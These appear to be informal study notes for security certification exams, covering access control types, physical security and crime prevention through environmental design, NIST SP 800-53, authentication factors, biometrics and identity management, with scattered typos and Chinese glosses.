transitive trust: With transitive access, party A trusts party B. If party B trusts party C, then party A also may trust party C.
In early operating systems, this process was often exploited.
In current operating systems, such as Windows Server 2016, the problems with transitive access are solved by creating transitive trusts, a type of relationship that exist between domains (the opposite is nontransitive trusts).
When the trust relationship is transitive, the relationship between A and B flows through as described earlier (A now trusts C).
In all versions of Active Directory, the default is that all domains in a forest trust each other with two-way, transitive trust relationships.
This process:
makes administration much easier when add a new child domain (no administrative intervention is required to establish the trusts),
it leaves the possibility of a hacker acquiring more trust than they should have by virtue of joining the domain.
 Controlling Access to Assets
Information Systems Devices Facilities Personne  Comparing subject & object
controlling which users can access which files or services
the relationships between entities (subjects and objects).
Access: the transfer of information from an object to a subject.
Subject: an active entity that accesses a passive object to receive information from an
object.
  - Subjects: users, programs, processes, computers, anything can access
resource.
  - When authorized, subjects can modify objects.
Object: a passive entity that provides information to active subjects.
  - Objects: files, databases, computers, programs, processes, printers, and
storage media.
Control Types
CompTIA lists the following control types in the objectives:
- TAP principle:
- Technical controls use technology.
- Administrative controls use administrative or management methods.
- Physical controls,controls you can physically touch.
  - Increase response time.
- Preventive controls attempt to prevent an incident from occurring.
- Detective controls attempt to detect incidents after they have occurred.
- Corrective controls attempt to reverse the impact of an incident.
- Deterrent controls attempt to discourage individuals from causing an incident.
- Compensating controls are alternative controls used when a primary control is not feasible.
 Types of access control
Identify and authenticate users or other subjects attempting to access resources. Determine whether the access is authorized.
Grant or restrict access based on the subject’s identity.
Monitor and record access attempts.    Preventi ve Access Control
  thwart or stop occurring the unwanted or unauthorized activity.
  fences, locks, biometrics, mantraps, lighting, alarm, auditing, smartcards, callback procedures,
security cameras, closed circuit television (CCTV),
separation of duties, job rotation, data classification, penetration testing, access control methods, encryption, security policies, security awareness training, antivirus software, firewalls, IPS.
   Security guards, OS hardening
     Detecti ve Access Control
     discover or detect unwanted or unauthorized activity. operate after the fact, can discover the activity only after it has occurred
    Examples:
security guards, security audits, motion detectors,
recording and reviewing of events in CCTV,
job rotation policies, mandatory vacation policies, audit trails, honeypots or honeynets,
IDS, violation reports, supervision and reviews of users, incident investigations, system
.
   logs
  Correcti ve Access Control
 modifies the environment to return systems to normal after an unwanted or unauthorized activity has occurred.
correct any problems that occurred by security incident.
  Corrective controls can be simple:
terminating malicious activity,
rebooting a system,
antivirus solutions remove or quarantine a virus, backup / restore plans, restored lost data,
active IDS, modify the environment to stop an
attack in progress.
  IPS
Security guard perform a post-incident review.
Alternate site
     Deterre nt 制止
Access Control
    discourage security policy
violations.
(deterrent controls: often depend on individuals deciding not to take an unwanted action. preventive control: In contrast, just blocks the action.)
   Examples:
policies,
security awareness training, locks, fences,
security badges, guards, mantraps security cameras.
Warning signs Lighting Login banners
 Technical Controls
Take the form of sorftware or hardware devices. use technology to reduce vulnerabilities.
An administrator installs and configures a technical control, and the technical control then provides the protection automatically.
examples:
- Encryption: strong technical control used to protect the confidentiality of data. This includes data transferred over a network and data stored on devices, such as servers, desktop computers, and mobile devices.
- Antivirus software. Once installed, the antivirus software provides protection against malware infection. Chapter 6, “Comparing Threats, Vulnerabilities, and Common Attacks,” covers malware and antivirus software in more depth.
- Intrusion detection systems (IDSs) and intrusion prevention systems (IPSs). IDSs and IPSs can monitor a network or host for intrusions and provide ongoing protection against various threats. Chapter 4, “Securing Your Network,” covers different types of IDSs and IPSs.
- Firewalls. Network firewalls restrict network traffic going in and out of a network. Chapter 3, “Exploring Network Technologies and Tools,” covers firewalls in more depth.
- Least privilege. The principle of least privilege specifies that individuals or processes are granted only the privileges they need to perform their assigned tasks or functions, but no more. Privileges are a combination of rights and permissions.
- Proxy, biometric authentication, permissions, auditing and similar technologies. Administrative Controls
Take the form of use methods mandated by organizational policies or other guidelines.
Many of these assessments provide an ongoing review of an organization’s risk management capabilities.
Some commonadministrative controls are:
- Risk assessments. Risk assessments help quantify and qualify risks within an organization so that the organization can focus on the serious risks. example, a quantitative risk assessment uses cost and asset values to quantify risks based on monetary values. A qualitativeriskassessmentuses judgments to categorize risks based on probability and impact.
- Vulnerability assessments. A vulnerability assessment attempts to discover current vulnerabilities or weaknesses. When necessary, an organization implements additional controls to reduce the risk from these vulnerabilities.
- Penetration tests. These go a stepfurther than a vulnerability assessment by attempting to exploit vulnerabilities. example, a vulnerability assessment might discover a server isn’t kept up to date with current patches, making it vulnerable to some attacks. A penetration test would attempt to compromise the server by exploiting one or more of the unpatchedvulnerabilities.
Chapter 8, “Using Risk Management Tools,” covers these assessments and tests in more depth. Some administrative controls focus on physical security and the environment. example, an access list identifies individuals allowed into a secured area. Guards then verify individuals are on the access list before allowing them in.
Many administrative controls are also known as operational or management controls. They help ensure that day-to-day operations of an organization comply with the organization’s overall security plan. People (not technology) implement these controls. Operational controls include the following families:
- Awareness and training. The importance of training to reduce risks cannot be overstated. Training helps users maintain password security, follow a clean desk policy, understand threats such as phishing and malware, and much more.
- Configuration and change management. Configuration management often uses baselines to ensure that systems start in a secure, hardened state. Change management helps ensure that changes don’t result in unintended configuration errors. Chapter 5 covers configuration and change management in more detail.
- Contingency planning. Chapter 9 presents several different methods that help an organization plan and prepare for potential system outages. The goal is to reduce the overall impact on the organization if an outage occurs.
- Media protection. Media includes physical media such as USB flash drives, external and internal drives, and backup tapes.
- Physical and environmental protection. This includes physical controls, such as cameras and door locks, and environmental controls, such as heating and ventilation systems.
Physical Controls
- any controls that you can physically touch.
  - Examples:lighting, signs, fences, security guards...
  - including environmental controls such as hot and cold aisles and fire suppression.
- However, it’s important to realize that many of these are also technical controls.
  - example, a fire suppression system is a physical security control and also a technical control because it uses technologies to detect, suppress, or extinguish fires.
Control Goals
Technical and administrative controls categorize the controls based on how they are implemented.
Another way of classifying security controls is based on their goals in relationship to security incidents. and compensating.
NIST and SP 800 Documents
The National Institute of Standards and Technology (NIST) is a part of the U.S. Department of Commerce, and it includes a Computer Security Division hosting the Information Technology Laboratory (ITL).
- The ITL publishes Special Publications (SPs) in the 800 series that are of general interest to the computer security community.
- Many IT security professionals use these documents as references to design secure IT systems and networks.
- Additionally, many security- related certifications also reference the SP 800 documents both directly and indirectly.
SP 800-53 Revision 4, “Security and Privacy Controls for Federal Information Systems and Organizations,” includes a wealth of information on security controls. It includes three relatively short chapters introducing security controls followed by multiple appendixes.
- Appendix F is a security control catalog that provides details on hundreds of individual security controls, divided into 21 different families.
- Additionally, each of these 21 families includes multiple groups.
  - example,
  - the Access Control family (AC) includes 25 different groups (AC-1 through AC-25).
  - The Account Management group (AC-2) describes 110 individual security controls related to account management.
- It’s worth noting that SP 800-53 Revision 3 attempted to identify every control as technical, management, or operational. However, many controls included characteristics from more than just one of these classifications. NIST removed these references in Revision 4.
- SP 800-53 Revision 4 and other SP 800 documents at http://csrc.nist.gov/ publications/PubsSPs.html.
  Boundary protection:
- First line defense:
  - Natural terrain 地形
  - Fences:
  - limited by local laws.
  - Never near parking
  - Must be monitor
  - Top guards:
  - barbed 有刺的 wire
  - Concertina wire
  - Razor wire   ⁃
  - Height:
  - 1meter / 3-4 feet: deter casual trespassers
  - 2 meters / 6-7 feet: defense climb easy
  - 2.5 meter / 8 feet: delay determined intruder.
  - Gates, Facility walls, Bollards
- Controlled access point: minimum nesessary, for car and person.
- Physical IDS: electronic sensors, presure sensors, temperature sensors,
vibration 震动 sensors.
- CCTV: detection, recognition, identication,
  - Operation parameter: size, depth, height, width, pan (360), tilt( up/ down), contrast
  - Protection and image retention (by law) 3,131

  - Maintain
- Guards and guard stations:
  - Discrimination judgment - Building entry points:
  - Doors, windows, loading ramps, elevator shafts, ventilation 通⻛设备 duct, crawlspaces (屋顶、地板下面)供电线或水管等通过的槽隙, sewage steam line
⁃
- Door: lighting, contact devices, solid core, hinges 小五金, lighting,
- Locks: locks, combincations (can be learn/hack), biometric (identify, authen, authou), pick persistent
  ⁃
- Windiw and glass:
  - standard plate plass, tempered glass (broke in small part), acrylic
material (yellow and scratch), polycarbonate 聚碳酸酯 windows (stop low powered rifle/bullet)   ⁃
  - Laminate (stop broke in small part), solar film (stop overheat, refection), bomb blast film/ lacy surtains, wired glass (stop easy break), intrusion detection/sensor.
Crime prevention through environmental design (CPTED) Strategies for the built environment
- Natural surveillance 盯梢 (monitor)
- Natural territorial 属地的 reinforcemen
- Natural access control
Natural surveillance 盯梢 (monitor)
- increases the perceived risk of attempting deviant 不正常的actions
  - by improving visibility of potential offenders to the general public.
- Natural surveillance occurs by
  - designing the placement of physical features, activities and people to maximize visibility of the space and its users,
  - fostering 哺育 positive social interaction among legitimate users of private and public space.
- Potential offenders
  - feel increased scrutiny 详细审查,
  - and thus inherently perceive increase risk
  - extends the perceived lack of viable and convert escape routes.
- Solutions:
  - Environment design:
  - Design streets to increase pedestrian 步行者 and bicycle traffic
  - Place windows overlooking sidewalks and parking lots.
  - Leave window shades open.   - Use passing vehicular traffic as a surveillance asset.
  - Create landscape designs that provide surveillance, especially in proximity to designated points of entry and opportunistic points of entry.
  - Use the shortest, least sight-limiting fence appropriate for the situation.
  - Use transparent weather vestibules ⻔厅 at building entrances.
  - creating lighting design
  - avoid poorly placed lights that create blind-spots for potential observers and miss critical areas. Ensure potential problem areas are well lit: pathways, stairs, entrances/exits, parking areas, ATMs, phone kiosks, mailboxes, bus stops, children's play areas, recreation areas, pools, laundry rooms, storage areas, dumpster and recycling areas, etc.
  - Avoid too-bright security lighting that creates blinding glare and/or deep shadows, hindering the view for potential observers. Eyes adapt to night lighting and have trouble adjusting to severe lighting disparities. Using lower intensity lights often requires more fixtures.
  - Use shielded or cut-off luminaires to control glare 强光.
  - Place lighting along pathways and other pedestrian-use areas at proper heights for lighting the faces of the people in the space (and to identify the faces of potential attackers).
  - Utilizing curved streets with multiple view points to multiple houses' entrances as well as making the escape route difficult to follow.  ⁃
  - Natural surveillance measures can be complemented by mechanical and organizational measures. For example, closed-circuit television (CCTV) cameras can be added in areas where window surveillance is unavailable.
Natural access control
- limits the opportunity for crime
  - by clearly differentiate between public space and private space.
  - By selectively placing entrances and exits, fencing, lighting and landscape to limit access or control flow, natural access control occurs.
- Solutions:
- Use a single, clearly identifiable, point of entry
- Use structures to divert persons to reception areas
- Incorporate maze entrances in public restrooms. This avoids the isolation that is produced by an anteroom or double door entry system
- Use low, thorny bushes beneath ground level windows. Use rambling or climbing thorny plants next to fences to discourage intrusion.
- Eliminate design features that provide access to roofs or upper levels
- In the front yard, use waist-level, picket-type fencing along residential property lines to control access, encourage surveillance.
- Use a locking gate between front and backyards.
- Use shoulder-level, open-type fencing along lateral residential property lines between side yards and extending to between back yards. They should be sufficiently unencumbered with landscaping to promote social interaction between neighbors.
- Use substantial, high, closed fencing (for example, masonry) between a backyard and a public alley instead of a wall which blocks the view from all angles.
- Natural access control is used to complement mechanical and operational access control measures, such as target hardening.
Natural territorial 属地的 reinforcemen
- promotes social control through increased definition of space and improved
proprietary concern.
- An environment designed to clearly delineate private space does two things.
  - First, it creates a sense of ownership. Owners have a vested interest and are more likely to challenge intruders or report them to the police.
  - Second, the sense of owned space creates an environment where "strangers" or "intruders" stand out and are more easily identified.
- By using buildings, fences, pavement, signs, lighting and landscape to express ownership and define public, semi-public and private space, natural territorial reinforcement occurs. - Additionally, these objectives can be achieved by assignment of space to designated users in previously unassigned locations.
- Solutions:
- Maintained premises and landscaping such that it communicates an alert and active presence occupying the space.
- Provide trees in residential areas. Research results indicate that, contrary to traditional views within the law enforcement community, outdoor residential spaces with more trees are seen as significantly more attractive, more safe, and more likely to be used than similar spaces without trees.
- Restrict private activities to defined private areas.
- Display security system signage at access points.
- Avoid chain link fencing and razor-wire fence topping, as it communicates the absence of a physical presence and a reduced risk of being detected.
- Placing amenities such as seating or refreshments in common areas in a commercial or institutional setting helps to attract larger numbers of desired users.
- Scheduling activities in common areas increases proper use, attracts more people and increases the perception that these areas are controlled.
- Motion sensor lights at all entry points into the residence.
- Territorial reinforcement measures make the normal user feel safe and make the potential offender aware of a substantial risk of apprehension or scrutiny 监视.
- When people take pride in what they own and go to the proper measures to protect their belongings, crime is deterred from those areas because now it makes it more of a challenge.
  - Criminals don't want their job to be hard; if it was hard they wouldn't do it.
  - The more difficult it is to commit a crime in certain areas, the less crime will occur. ▪


## Other CPTED elements Maintenance
- Maintenance is an expression of ownership of property.
- Deterioration indicates less control by the intended users of a site and indicate a greater tolerance of disorder.
- The Broken Windows Theory
  - the importance of maintenance in deterring crime.
  - support a zero tolerance approach to property maintenance, observing that the presence of a broken window will entice vandals to break more windows in the vicinity.
  - The sooner broken windows are fixed, the less likely it is that such vandalism will occur in the future.
  - Vandalism falls into the broken windows category as well. The faster the graffiti is painted over, the less likely one is to repeat because no one saw what has been done.
- Having a positive image in the community shows a sense of pride and self- worth that no one can take away from the owner of the property.
Activity support
Activity support increases the use of a built environment for safe
activities with the intent of increasing the risk of detection of criminal and undesirable activities.
Natural surveillance by the intended users is casual and there is no specific plan for people to watch out for criminal activity.
By placing signs such as caution children playing and signs for
certain activities in the area, the citizens of that area will be more involved in what is happening around them. They will be more tuned
   in to who is and who isn't supposed to be there and what looks suspicious on a day-to-day life.
Server room/data centers
- Controlled access area
- Walls go slab to slab (prevent crawl underneath, stop fire,
smoke..., a contained area)
- Temperature controlled (too high: overhearts, too low:
condensation 冷凝) 100F
- Humidity (high: corrosion 腐蚀, low: static electricity) 20-80
Meida storage:
- Track tape usage by date, Number of uses, Meantime of failure.
- As close as possible.
Fire
- Fllow local fire codes.
- Fire prevention, detection, suppression.
- Location of IT assests.
- Location and type of fire suppression systems. (Flooding systems,
handheld extinguisers)
  - Fire requires: fire trangle: oxygen, heat, fule, trigger,
  - Fire suppression:
  - Heat - reduce temperature. (Water)
  - Fuel - remove the source.
  - Oxygen - displace / smother the oxygen source with other
gasses, foam, etc.   - Chemical reaction - prevent through binding agents.
- Building material used.
- Smoke detection: ion, light, molecular breakdown, (VESDA, very
early smoke detection apparatus 机构)
- Heat detection:
- Flame detection.
   Power: Preventive Controls
Ideally, an organization won’t have any security incidents and that is the primary
goal of preventive controls—to prevent security incidents. Some examples include:
- Hardening. Hardening is the practice of making a system or application more secure than its default configuration. This uses a defense-in-depth strategy with layered security. This includes disabling unnecessary ports and services, implementing secure protocols, using strong passwords along with a robust password policy, and disabling default and unnecessary accounts. These topics are covered in more depth in Chapter 5.
- Security awareness and training. Ensuring that users are aware of security vulnerabilities and threats helps prevent incidents.When users understand how social engineers operate, they are less likely to be tricked. example, uneducated users might be tricked into giving a social engineer their passwords, but educated users will see through the tactics and keep their passwords secure.
- Security guards. Guards prevent and deter many attacks. example, guards can prevent unauthorized access into secure areas of a building by first verifying user identities. Although a social engineer might attempt to fool a receptionist into letting him into a secure area, the presence of a guard will deter many social engineers from even trying these tactics.
- Change management. Change management ensures that changes don’t result in unintended outages. In other words, instead of administrators making changes on the fly, they submit the change to a change management process. Notice that change management is an operational control, which attempts to prevent incidents. In other words, it’s both an operational control and a preventive control.
- Account disablement policy. Anaccountdisablementpolicyensuresthatuseraccounts are disabled when an employee leaves. This prevents anyone, including ex- employees, from continuing to use these accounts. Chapter 2 covers account disablement policies in more depth.
Detective Controls
attempt to detect when vulnerabilities have been exploited, resulting in a security incident.
detective controls discover the event after it’s occurred.
Some examples of detective controls are:
- Log monitoring. Several different logs record details of activity on systems and networks. example, firewall logs record details of all traffic that the firewall blocked. By monitoring these logs, it’s possible to detect incidents. Some automated methods of log monitoring automatically detect potential incidents and report them right after they’ve occurred.
- Trend analysis. In addition to monitoring logs to detect any single incident, you can also monitor logs to detect trends. example, an intrusion detection system (IDS) attempts to detect attacks and raise alerts or alarms. By analyzing past alerts, you can identify trends, such as an increase of attacks on a specific system.
- Security audit. Security audits can examine the security posture of an organization. example, a password audit can determine if the password policy is ensuring the use of strong passwords. Similarly, a periodic review of user rights can detect if users have more permissions than they should.
- Video surveillance. A closed-circuit television (CCTV) system can record activity and detect what occurred. It’s worth noting that video surveillance can also be used as a deterrent control.
- Motion detection. Many alarm systems can detect motion from potential intruders and raise alarms. # Detection vs Prevention Controls
the differences between detection and prevention controls.
- detective control can’t predict when an incident will occur and it can’t
prevent it.
- prevention control prevent the incident from occurring at all.
Consider cameras and guards:
- Video surveillance 盯梢 . A simple camera without recording capabilities
can prevent incidents because it acts as a deterrent. Compare this with a CCTV system with recording abilities. It includes cameras, which can prevent incidents. The full system is also a detection control because of the recording capabilities. Security professionals can review the recordings to detect incidents after they’ve occurred.
- Guards. Guards are primarily prevention controls. They will prevent many incidents just by their presence.
Corrective Controls
attempt to reverse the impact of an incident or problem after it has occurred.
Some examples of corrective controls are:
- IPS. An intrusion prevention system (IPS) attempts to detect attacks and
then modify the environment to block the attack from continuing. Chapter 4 covers IPSs in more depth.
- Backups and system recovery. Backups ensure that personnel can recover data if it is lost or corrupted. Similarly, system recovery procedures ensure administrators can recover a system after a failure. Chapter 9 covers backups and disaster recovery plans in more depth.
Deterrent Controls
- attempt to 劝阻 discourage a threat. Some deterrent controls attempt to discourage potential attackers from attacking, and others attempt to discourage employees from violating a security policy. - often describe many deterrent controls as preventive controls.
  - Example: imagine an organization hires a security guard to control access to a restricted area of a building. This guard will deter most people from trying to sneak in simply by discouraging them from even trying. This deterrence prevents security incidents related to unauthorized access.
The following list identifies some physical security controls used to deter threats:
- Cable locks. Securing laptops to furniture with a cable lock deters thieves
from stealing the laptops. Thieves can’t easily steal a laptop secured this way. If they try to remove the lock, they will destroy it. Admittedly, a thief could cut the cable with a large cable cutter. However, someone walking around with a four-foot cable cutter looks suspicious. If you’re not familiar with a cable lock, refer to the “Using Hardware Locks” section in Chapter 9.
- Hardware locks. Other locks such as locked doors securing a wiring closet or a server room also deter attacks. Many server bay cabinets also include locking cabinet doors.
Compensating Controls
- are alternative controls used instead of a primary control.
- example, an organization might require employees to use smart cards when authenticating on a system. However, it might take time for new employees to receive their smart card. To allow new employees to access the network and still maintain a high level of security, the organization might choose to implement a Time-based One-Time Password (TOTP) as a compensating control. The compensating control still provides a strong authentication solution.
Combining Control Types and Goals
It’s important to realize that the control types (technical, administrative, and physical) and control goals (preventive, detective, corrective, deterrent, and compensating) are not mutually exclusive. In other words, you can describe most controls using more than one category.
example, encryption is a preventive technical control. It helps prevent the loss of data confidentiality, so it is a preventive control. You implement it with technology, so it is a technical control. If you understand control categories, you shouldn’t have any problems picking out the correct answers on the exam even if CompTIA combines them in a question, such as a preventive technical control.
Implementation types
  Administrative Access Controls
policies and procedures defined by an organization’s security policy and other regulations or requirements.
sometimes referred to as management controls
controls focus on personnel and business practices.
Examples of administrative access controls include policies, procedures, hiring
practices, background checks, classifying and labeling data, security awareness and training efforts, reports and reviews, personnel controls, and testing.
 Logical/Technical Controls
- Logical access controls (also known as technical access controls ) are the hardware or software mechanisms used to manage access and to provide protection for resources and systems. As the name implies, they use technology.
- Examples of logical or technical access controls include authentication methods (such as passwords, smartcards, and biometrics), encryption, constrained interfaces, access control lists, protocols, firewalls, routers, intrusion detection systems, and clipping levels.
 Physical Controls
- Physical access controls are items you can physically touch.
- include physical mechanisms deployed to prevent, monitor, or detect direct contact
with systems or areas within a facility.
•Examples of physical access controls include guards, fences, motion detectors,
locked doors, sealed windows, lights, cable protection, laptop locks, badges, swipe cards, guard dogs, video cameras, mantraps, and alarms.  CIA Triad
•Confidentiality: Access controls help ensure that only authorized subjects can access objects. When unauthorized entities are able to access systems or data, it results in a loss of confidentiality.
- Integrity: ensures that data or system configurations are not modified without authorization, or if unauthorized changes occur, security controls detect the changes. If unauthorized or unwanted changes to objects occur, it results in a loss of integrity.
- Availability: Authorized requests for objects must be granted to subjects within a reasonable amount of time. In other words, systems and data should be available to users and other subjects when they are needed. If the systems are not operational, or the data is not accessible, it results in a loss of availability.
 Comparing Identification & Authentication
- Identification : the process of a subject claiming, or professing, an identity.
1. A subject must provide an identity to a system to start the authentication,
authorization, and accountability processes.
2. Providing an identity might entail typing a username; swiping a smartcard; waving a token device; speaking a phrase; or positioning your face, hand, or finger in front of a camera or in proximity to a scanning device.
3. A core principle with authentication is that all subjects must have unique identities.  Comparing Identification & Authentication
- Authentication: verifies the identity of the subject by comparing one or more factors against a database of valid identities, such as user accounts.
1. Authentication information used to verify identity is private information and needs to be protected.
2. Asanexample,passwordsarerarelystoredincleartextwithin a database. Instead, authentication systems store hashes of passwords within the authentication database.
3. The ability of the subject and system to maintain the secrecy of the authentication information for identities directly reflects the level of security of that system.
 - Identification and authentication always occur together as a single two-step process. Providing an identity is the first step, and providing the authentication information is the second step. Without both, a subject cannot gain access to a system.
•Each authentication technique or factor has unique benefits and drawbacks. Thus, it is important to evaluate each mechanism in the context of the environment where it will be deployed. example, a facility that processes Top Secret materials requires very strong authentication mechanisms. In contrast, authentication requirements within a classroom environment are significantly less.
 Registration and Proofing of Identity
•The registration process occurs when a user is first given an identity. Within an organization, new employees prove their identity with appropriate documentation during the hiring process. Personnel within a Human Resource (HR) department then begin the process of creating their user ID.
•Registration is more complex with more secure authentication methods. example, if the organization uses fingerprinting as a biometric method for authentication, registration includes capturing user fingerprint.  Identity proofing is a little different for users interacting with online sites, such as an online banking site. When a user first tries to create an account, the bank will take extra steps to validate the user’s identity. This normally entails asking the user to provide information that is known to the user and the bank such as account numbers and personal information about the user such as a national identification number or Social Security Number.
During this initial registration process, the bank will also ask the user to provide additional information, such as the user’s favorite color, the middle name of their oldest sibling, or the model of their first car. Later, if the user needs to change their password or wants to transfer money, the bank can challenge the user with these questions as a method of identity proofing.
 Authorization and Accountability
- Authorization Subjects are granted access to objects based on proven identities. example, administrators grant users access to fi les based on the user’s proven identity.
- Accountability Users and other subjects can be held accountable for their actions when auditing is implemented. Auditing tracks subjects and records when they access objects, creating an audit trail in one or more audit logs. example, auditing can record when a user reads, modifies, or deletes a fi le. Auditing provides accountability.
 Authorization
•Authorization indicates who is trusted to perform specific operations. If the action is allowed, the subject is authorized; if disallowed, the subject is not authorized. Here’s a simple example: if a user attempts to open a fi le, the authorization mechanism checks to ensure that the user has at least read permission on the file.
- It’s important to realize that just because users or other entities can authenticate to a system, that doesn’t mean they are given access to anything and everything. Instead, subjects are authorized access to specific objects based on their proven identity. The process of authorization ensures that the requested activity or object access is possible based on the privileges assigned to the subject.
- Identification and authentication are “all-or-nothing” aspects of access control. Either a user’s credentials prove a professed identity, or they don’t. In contrast, authorization occupies a wide range of variations. example, a user may be able to read a fi le but not delete it or print a document but not alter the print queue.  Accountability
Auditing, logging, and monitoring provide accountability by ensuring that subjects can
be held accountable for their actions.
Auditing is the process of tracking and recording subject activities within logs. Logs typically record who took an action, when and where the action was taken, and what the action was. One or more logs create an audit trail that researchers can use to reconstruct events and identify security incidents. When investigators review the contents of audit trails, they can provide evidence to hold people accountable for their actions.
There’s a subtle but important point to stress about accountability. Accountability relies on effective identification and authentication, but it does not require effective authorization. In other words, after identifying and authenticating users, accountability mechanisms such as audit logs can track their activity, even when they try to access resources that they aren’t authorized to access
 Authentication Factors
Type 1 : include a password, personal identification number (PIN), or passphrase.
Type 2 : something you have, include a smartcard, hardware token, smartcard, memory card , or USB drive. Physical devices that a user possesses can help them provide authentication.
- Type 3 : something you are or something you do. It is a physical characteristic of a person identified with different types of biometrics. Examples in the something- you-are category include fingerprints, voice prints, retina patterns, iris patterns, face shapes, palm topology, and hand geometry. Examples in the something-you- do category include signature and keystroke dynamics, also known as behavioral biometrics.  Smartcards and Tokens
- A smartcard is a credit card–sized ID or badge and has an integrated circuit chip embedded in it. Smartcards contain information about the authorized user that is used for identification and/or authentication purposes. Most current smartcards include a microprocessor and one or more certificates. The certificates are used for asymmetric cryptography such as encrypting data or digitally signing email.
- Smartcards are tamper resistant and provide users with an easy way to carry and use complex encryption keys.
•Users insert the card into a smartcard reader when authenticating. It’s common to require users to also enter a PIN or password as a second factor of authentication with the smartcard.
 A token, or hardware token , is a password-generating device that users can carry with them. A common token used today includes a display that shows a six- to eight- digit number.
An authentication server stores the details of the token, so at any moment, the server knows what number is displayed on the user’s token. Tokens are typically combined with another authentication mechanism. example, users might enter a username and password (in the something-you-know factor of authentication) and then enter the number displayed in the token (in the something-you-have factor of authentication). This provides multifactor authentication.
- Hardware tokens use dynamic one-time passwords, making them more secure than static passwords. The two types of tokens are synchronous dynamic password tokens and asynchronous dynamic password tokens .  - Synchronous Dynamic Password Tokens: Hardware tokens that create synchronous dynamic passwords are time-based and synchronized with an authentication server. They generate a new password periodically, such as every 60 seconds. This does require the token and the server to have accurate time. A common way this is used is by requiring the user to enter a username, static password, and the dynamic one-time password into a web page.
- Asynchronous Dynamic Password Tokens : does not use a clock. Instead, the hardware token generates passwords based on an algorithm and an incrementing counter. When using an incrementing counter, it creates a dynamic one-time password that stays the same until used for authentication. Some tokens create a one-time password when the user enters a PIN provided by the authentication server into the token. example, a user would first submit a username and password to a web page. After
 Biometrics (the best)
Using a biometric factor instead of a username or account ID as an identification factor requires a one-to-many search of the offered biometric pattern against a stored database of enrolled and authorized patterns. Capturing a single image of a person and searching a database of many people looking for a match is an example of a one-to-many search. As an identification technique, biometric factors are used in physical access controls.
Using a biometric factor as an authentication technique requires a one-to-one match of the offered biometric pattern against a stored pattern for the offered subject identity. In other words, the user claims an identity, and the biometric factor is checked to see if the person matches the claimed identity. As an authentication technique, biometric factors are used in logical access controls.
 •Biometric characteristics are often defined as either physiological or behavioral.
1. Physiological biometric methods include fingerprints, face scans, retina scans, iris scans, palm scans (also known as palm topography or palm geography), Heart/Pulse Patterns, hand geometry, and voice patterns.
2. Behavioralbiometricmethodsincludesignaturedynamicsand keystroke patterns (keystroke dynamics). These are sometimes referred to as something-you-do authentication.  Biometric Factor Error Ratings Type 1 error
  - false rejection rate (FRR). To sensitibe.
  - false negative authentication
  - occurs when a valid subject is not authenticated.
Type 2 Error :
  - false acceptance rate (FAR). Not sensitive
  - false positive authentication
  - occurs when an invalid subject is authenticated.
  - This is also known as a false positive authentication.
CER: best point.
  Biometric Registration
- Biometric devices can be ineffective or unacceptable due to factors known as enrollment time, throughput rate, and acceptance.
- For a biometric device to work as an identification or authentication mechanism, a process called enrollment (t or registration) must take place.
•During enrollment, a subject’s biometric factor is sampled and stored in the device’s database.
- This stored sample of a biometric factor is the reference profile (also known as a reference template).  Biometric Registration
- The time required to scan and store a biometric factor depends on which physical or performance characteristic is measured.
- Users are less willing to accept the inconvenience of biometric methods that take a long time. In general, enrollment times over 2 minutes are unacceptable. If you use a biometric characteristic that changes over time, such as a
 Multifactor Authentication
- Multifactor authentication is any authentication using two or more factors. •Two-factor authentication requires two different factors to provide authentication.
example, when using a debit card at the grocery store, you must usually swipe the card (something you have) and enter a PIN (something you know) to complete the transaction.
Similarly, smartcards typically require users to insert their card into a reader and also enter a PIN. As a general rule, using more types or factors results in more secure authentication.
 When two authentication methods of the same factor are used together, the strength of the authentication is no greater than it would be if just one method were used because the same attack that could steal or obtain one could also obtain the other. example, using two passwords together is no more secure than using a single password because a password- cracking attempt could discover both in a single successful attack.
In contrast, when two or more different factors are employed, two or more different methods of attack must succeed to collect all relevant authentication elements. example, if a token, a password, and a biometric factor are all used for authentication, then a physical theft, a password crack, and a biometric duplication attack must all succeed simultaneously to allow an intruder to gain entry into the system.  Device Authentication
- Historically, users have only been able to log into a network from a company-owned system such as a desktop PC. example, in a Windows domain user computers join the domain and have computer accounts and passwords similar to user accounts and passwords. If the computer hasn’t joined the domain, or its credentials are out of sync with a domain controller, users cannot log on from this computer.
- Today, more and more employees are bringing their own devices to work and hooking them up to the network. Some organizations embrace this, but implement BYOD security policies as a measure of control. These devices aren’t necessarily able to join a domain, but it is possible to implement device identification and authentication methods for these devices.
 One method is device fingerprinting. Users can register their devices with the organization, and associate them with their user accounts. During registration, a device authentication system captures characteristics about the device. This is often accomplished by having the user access a web page with the device. The registration system then identifies the device using characteristics such as the operating system and version, web browser, browser fonts, browser plug-ins, time zone, data storage, screen resolution, cookie settings, and HTTP headers.
When the user logs on from the device, the authentication system checks the user account for a registered device. It then verifies the characteristics of the user’s device with the registered device. Even though some of these characteristics change over time, this has proven to be a successful device authentication method. Organizations typically use thirdparty tools, such as the SecureAuth Identity Provider (IdP), for device authentication.
 Implementing Identity Management
- Centralized access control implies that all authorization verification is performed by a single entity within a system.
- Decentralized access control (also known as distributed access control ) implies that various entities located throughout a system perform authorization verification.   Credential Management Systems
- A credential management system provides a storage space for users to keep their credentials when SSO isn’t available. Users can store credentials for websites and network resources that require a different set of credentials. The management system secures the credentials with encryption to prevent unauthorized access.
- Third-party credential management systems are also available. example, KeePass is a freeware tool that allows you to store your credentials. Credentials are stored in an encrypted database and users can unlock the database with a master password. Once unlocked, users can easily copy their passwords to paste into a website form. It’s also possible to configure the app to enter the credentials automatically into the web page form. Of course, it’s important to use a strong master password to protect all the other credentials
 Integrating Identity Services
•Identity services provide additional tools for identification and authentication. Some of the tools are designed specifically for cloud- based applications whereas others are third-party identity services designed for use within the organization (on-premises).
- Identity as a Service, or Identity and Access as a Service (IDaaS) is a third-party service that provides identity and access management. IDaaS effectively provides SSO for the cloud and is especially useful when internal clients access cloud-based Software as a Service (SaaS) applications. Google implements this with their motto of “One Google Account for everything Google.” Users log into their Google account once and it provides them access to multiple Google cloud-based applications without requiring users to log in again.  Managing Sessions
When using any type of authentication system, it’s important to manage sessions to
prevent unauthorized access. This includes sessions on regular computers such as desktop PCs and within online sessions with an application.
Desktop PCs and laptops include screen savers. These change the display when the computer isn’t in use by displaying random patterns or different pictures, or simply blanking the screen. Screen savers protected the computer screens of older computers but new displays don’t need them. However, they’re still used and screen savers have a password protect feature that can be enabled. This feature displays the logon screen and forces the user to authenticate again prior to exiting the screen saver.
 AAA Protocols
- Several protocols provide authentication, authorization, and accounting and are referred to as AAA protocols.
